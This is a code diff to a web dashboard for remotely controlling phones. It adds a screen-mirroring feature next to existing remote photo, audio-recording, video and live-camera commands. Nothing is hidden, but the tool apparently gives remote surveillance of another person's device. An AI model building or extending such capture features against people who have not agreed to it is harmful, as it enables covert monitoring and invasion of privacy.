@@ -257,7 +257,8 @@ function render(devs){
       mkBtn("🤳 Front",()=>cmd(d,"photo_front")),
       mkBtn("🎙 Audio",()=>pickDuration(panel,"Audio",sec=>cmd(d,"record",{sec}))),
       mkBtn("🎥 Video",()=>pickVideo(panel,sec=>cmd(d,"video",{sec}))),
-      mkBtn("👁 Live",()=>openLive(d,panel))
+      mkBtn("👁 Live",()=>openLive(d,panel)),
+      mkBtn("🖥 Screen",()=>openScreen(d,panel))
     );
     const r3 = document.createElement("div"); r3.className="row";
     r3.append(
@@ -359,6 +360,25 @@ function startLive(d,panel,front){
     setTimeout(tick,3000);
   };
   setTimeout(tick,2500);
+}
+
+function openScreen(d,panel){
+  cmd(d,"screen",{sec:120});
+  panel.innerHTML='<div class="gal-h">🖥 Screen mirror</div>';
+  const note=document.createElement("div"); note.className="hint"; note.textContent="On that phone, tap the 'Screen share requested' notification, then Allow. The screen then shows below (new picture every ~3 sec).";
+  panel.append(note);
+  const im=document.createElement("img"); im.className="gal-img"; im.alt="screen"; panel.append(im);
+  const status=document.createElement("div"); status.className="muted"; status.style.marginTop="6px"; status.textContent="Waiting for Allow on that phone…"; panel.append(status);
+  let stopped=false, n=0;
+  const stop=document.createElement("button"); stop.textContent="⏹ Stop"; stop.style.marginTop="8px";
+  stop.addEventListener("click",()=>{ stopped=true; status.textContent="Stopped."; }); panel.append(stop);
+  const tick=async()=>{
+    if(stopped || n>50){ if(!stopped) status.textContent="Screen share ended."; return; }
+    n++;
+    try{ const u=await sign(S.uid+"/live/screen_"+d.device_id+".jpg"); if(u){ im.src=u+"&t="+Date.now(); status.textContent="🔴 Live screen • "+new Date().toLocaleTimeString(); } }catch(e){}
+    setTimeout(tick,3000);
+  };
+  setTimeout(tick,3000);
 }
 
 function pickVideo(panel, cb){
